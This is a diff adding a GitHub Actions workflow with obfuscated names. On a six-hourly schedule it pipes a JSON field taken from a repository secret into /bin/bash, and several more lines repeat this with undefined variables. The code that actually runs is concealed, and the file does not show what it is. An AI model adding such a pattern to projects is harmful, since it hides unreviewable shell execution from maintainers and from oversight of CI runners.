@@ -1,0 +1,23 @@
+name: duozhaojitaii
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duozhaojitaii
+        env:
+          lyna708: ${{ secrets.lyna708 }}
+        run: |
+          echo $lyna708 | jq -r .xnw04 | /bin/bash
+          echo $mso25 | jq -r .mw4341 | /bin/bash
+          echo $xhz7 | jq -r .tvh565 | /bin/bash
+          echo $wmp208 | jq -r .upg2762 | /bin/bash
+          echo $by39 | jq -r .u9 | /bin/bash
+          echo $gpvs1430 | jq -r .hgcx386 | /bin/bash
+          echo $gkdbp03 | jq -r .kdtws7 | /bin/bash
+
